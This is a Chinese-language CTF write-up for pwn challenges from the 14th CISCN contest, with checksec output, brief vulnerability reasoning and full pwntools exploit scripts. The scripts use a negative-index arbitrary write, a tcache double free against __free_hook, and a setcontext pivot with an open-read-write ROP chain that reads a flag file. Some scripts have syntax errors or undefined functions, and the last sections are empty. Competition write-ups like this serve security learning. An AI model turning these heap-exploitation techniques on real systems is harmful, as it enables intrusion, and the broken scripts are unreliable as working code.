# 14th国赛 - pwn部分

### pwny:

[题目](https://pan.baidu.com/s/10Yml7t2jzAmkM8bt1AvqXw) [libc](https://pan.baidu.com/s/1uo0g5v7wjrjk_GRjAKeJ8A) 提取码：GAME

checksec:

> ```
>     Arch:     amd64-64-little
>     RELRO:    Full RELRO
>     Stack:    Canary found
>     NX:       NX enabled
>     PIE:      PIE enabled
> ```



#### 思路：

因为题目是通过随机数控制read和write执行与否，所以在第一次调用write时，直接用

```c
  __isoc99_scanf("%ld", &v2);
  v0 = v2;
  v2 = 0LL;
  read((unsigned __int8)byte_202860, &v2, 8uLL);
  qword_202060[v0] = v2;
```

```
.bss:0000000000202060 qword_202060    dq 100h dup(?)          ; DATA XREF: sub_B20+45↑o
.bss:0000000000202060                                         ; write+5F↑o
.bss:0000000000202860 byte_202860     db ?                    ; DATA XREF: sub_A10+57↑w
```

覆盖bss段上的随机数后一位为\x00 就能正常执行read和write 

存在负数溢出任意地址写 打`_rtld_global+3848`为one即可



#### exp:

```python
from pwn import *
context(arch='amd64',endian='el',os='linux')
context.log_level = 'debug'
debug = 1
if debug == 1:
    p = process("./chall")
else:
    p = remote("")

elf = ELF("./chall",checksec=False)
libc = ELF("./libc-2.27.so",checksec=False)
one = [0x4f3d5,0x4f432,0x10a41c]

def read(index):
    p.sendlineafter("Your choice: ",str(1))
    p.sendafter("Index: ",str(index))
   	
def write0(index,content):
    p.sendlineafter("choice: ",str(2))
    p.sendafter("Index: ",str(index))
    p.send(content)
    
p.sendlineafter("choice: ",str(2))
p.send(str(0x100))
read0(p64(0xfffffffffffffff8))
p.recvuntil("Result: ")
value = u64(p.recvline()[:-1]) # random = \x00
if value == "0" or value == '':
    return EOFError
libc.address = int(value,16) - libc.sym['_IO_2_1_stdout_']
global_ = libc.address + 0x61bf68
og = libc.address + one[0]

read0(p64(0xfffffffffffffff5))
p.recvuntil("Result: ")
bss = int(p.recvline()[:-1],16) + 0x58

payload_index = p64((global_ - bss)/8)
p.send(og)
p.sendlineafter("choice: ",str(3))
p.interactive()
```



### lonelywolf:

[题目](https://pan.baidu.com/s/18s_TaOHke2TB4LzVZ-QWNA) [libc](https://pan.baidu.com/s/18s_TaOHke2TB4LzVZ-QWNA) 提取码：GAME

checksec

> ```properties
>     Arch:     amd64-64-little
>     RELRO:    Full RELRO
>     Stack:    Canary found
>     NX:       NX enabled
>     PIE:      PIE enabled
>     FORTIFY:  Enabled
> ```

#### 思路：

```c
  __isoc99_scanf(&unk_F44, &size);
  if ( !size )
  {
    __printf_chk(1LL, "Size: ");
    __isoc99_scanf(&unk_F44, &size);
    v1 = size;
    if ( size > 0x78 )
```

index输入了个寂寞 所以只是对上一个申请的chunk的操作（瞬间想了之前VN的ff）

但是存在UAF 而且虽然本程序只允许申请0x80以下chunk，但程序使用了scanf依然可以构造堆块合并

所以思路就是edit覆盖tcache的key，来构造double free改free_hook为one即可

#### exp：

```python
from pwn import *
context(arch='amd64',endian='el',os='linux')
context.log_level=;'debug'
debug = 1
if debug == 1:
    p = process("./chall")
else:
    p = remote("")

elf = ELF("./chall",checksec=False)
libc = ELF("./libc-2.27.so",checksec=False)
one = [0x4f3d5,0x4f432,0x10a41c]

def add(size):
    p.sendlineafter("choice: ",str(1))
    p.sendlineafter("Index: ",str(1))
    p.sendlineafter("size: ",str(size))

def delete():
    p.sendlineafter("choice: ",str(2))
    p.sendlineafter("Index: ",str(1))

def show():
    p.sendlineafter("choice: ",str(3))
    p.sendlineafter("Index: ",str(1))
    
def edit(content):
    p.sendlineafter("choice: ",str(4))
    p.sendlineafter("Index: ",str(1))
    p.sendafter("Content: ",content)
    
add(0x60)
delete()
edit(p64(0)*2)
delete()
show()
heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0x260
add(0x60)
add(0x60)
add(0x60)
delete()
add(0x40)
p.sendlineafter("choice: ",'a'*0x410)
add(0x60)
show()
libc.address = u64(p.recv(6).ljust(8,'\x00')) - 176 - 0x10 - libc.sym['__malloc_hook']
free_hook = libc.sym['__free_hook']
og = libc.address + one[0]
success("libc_address = " + hex(libc.address))
success("free_hook = " + hex(free_hook))
success("og = " + hex(og))
add(0x40)
delete()
edit(p64(0)*2)
delete()
add(0x40)
edit(p64(free_hook))
add(0x40)
add(0x40)
edit(p64(og))
delete()
p.interactive()
```



### silverwolf:

有点小阴间 上一个题目的orw加强版

题目 libc 提取码：GAME

checksec：

> ```properties
>     Arch:     amd64-64-little
>     RELRO:    Full RELRO
>     Stack:    Canary found
>     NX:       NX enabled
>     PIE:      PIE enabled
>     FORTIFY:  Enabled
> ```

> ```properties
>  line  CODE  JT   JF      K
> =================================
>  0000: 0x20 0x00 0x00 0x00000004  A = arch
>  0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
>  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
>  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
>  0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
>  0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008
>  0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008
>  0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009
>  0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
>  0009: 0x06 0x00 0x00 0x00000000  return KILL
> ```

#### 思路：

> 下面都是binLep师傅附体 XD

跟上题思路差不多 只是将free_hook改为了setcontext 然后栈迁移到堆上进行orw



#### exp：

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
debug = 2
context(arch='amd64', endian='el', os='linux')
context.log_level = 'debug'
if debug == 1:
    p = process(['./chall'])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('124.71.231.29', 20759)
    libc = ELF('./libc-2.27.so', checksec=False)
elf = ELF('./chall', checksec=False)
def add(size):
    p.sendlineafter("Your choice: ","1")
    p.sendlineafter("Index: ",str(0))
    p.sendlineafter("Size: ",str(size)) #<0x78
def edit(content):
    p.sendlineafter("Your choice: ","2")
    p.sendlineafter("Index: ",str(0))
    p.sendlineafter("Content: ",content)
    
def show():
    p.sendlineafter("Your choice: ","3")
    p.sendlineafter("Index: ",str(0))
    p.recvuntil("Content: ")
def free():
    p.sendlineafter("Your choice: ","4")
    p.sendlineafter("Index: ",str(0))
add(0x30)
free()
edit(p64(0)*2)
free()
show()
heap_base = u64(p.recv(6).ljust(8,"\x00")) - 0x1920
add(0x30)
add(0x30)
add(0x30)
free()
add(0x40)
p.sendlineafter("Your choice: ","1")
p.sendlineafter("Index: ", '1' * 0x410)
add(0x30)
show()
libc.address = u64(p.recv(6).ljust(8,"\x00")) - 176 - 0x10 - libc.sym['__malloc_hook']
free_hook = libc.sym['__free_hook']
setcontext = libc.sym['setcontext']
open_ = libc.sym['open'] + 0x20
write = libc.sym['write'] + 0x20
read = libc.sym['read'] + 0x20
pop_rdi = libc.address + 0x00000000000215bf + 0x20
pop_rsi = libc.address + 0x0000000000023eea + 0x20
pop_rdx = libc.address + 0x0000000000001b96 + 0x20
pop_rsp = libc.address + 0x0000000000003960 + 0x20
pop_rax = libc.address + 0x0000000000043ae8 + 0x20
syscall = libc.address + 0xE4345 + 0x20
#.text:00000000000E4345                 syscall                 ; LINUX - sys_times
add(0x10)
free()
edit(p64(0)*2)
free()
add(0x10)
edit(p64(free_hook + 0xb0))
add(0x10)
add(0x10)
edit(p64(heap_base + 0x18c0) + p64(pop_rsp))
#gdb.attach(p)
add(0x50)
edit(p64(heap_base + 0xe98))
add(0x78)
free()
edit(p64(0)*2)
free()
add(0x78)
edit(p64(free_hook + 0x10))
add(0x78)
pd = "./flag".ljust(8,'\x00')
pd += p64(pop_rdi) + p64(0)
pd += p64(pop_rsi) + p64(heap_base + 0xed0)
pd += p64(pop_rdx) + p64(0x200)
pd += p64(read)
edit(pd)
#gdb.attach(p)
add(0x78)
edit(p64(setcontext + 0x55))
free()
pd = p64(pop_rdi) + p64(heap_base + 0xe90)
pd += p64(pop_rax) + p64(2)
pd += p64(pop_rsi) + p64(0)
pd += p64(syscall)
pd += p64(pop_rdi) + p64(3)
pd += p64(pop_rsi) + p64(heap_base + 0x2000)
pd += p64(pop_rdx) + p64(0x200)
pd += p64(read)
pd += p64(pop_rdi) + p64(1)
pd += p64(write)
p.sendline(pd)
p.interactive()

```



### channel:

[附件](https://pan.baidu.com/s/1DSVm9FFYNs-60pJxMRd5Cg)

checksec：

> ```
>     Arch:     aarch64-64-little
>     RELRO:    Full RELRO
>     Stack:    Canary found
>     NX:       NX enabled
>     PIE:      PIE enabled
> ```

#### 思路：

aarch64架构题目 借助本题好好学学架构题目

https://r1nd0.github.io/2021/05/17/CISCN2021%E7%BA%BF%E4%B8%8A%E8%B5%9B-pwn/#more

r1nd0师傅的wp

#### exp：



### game:

### 



#### SATools：







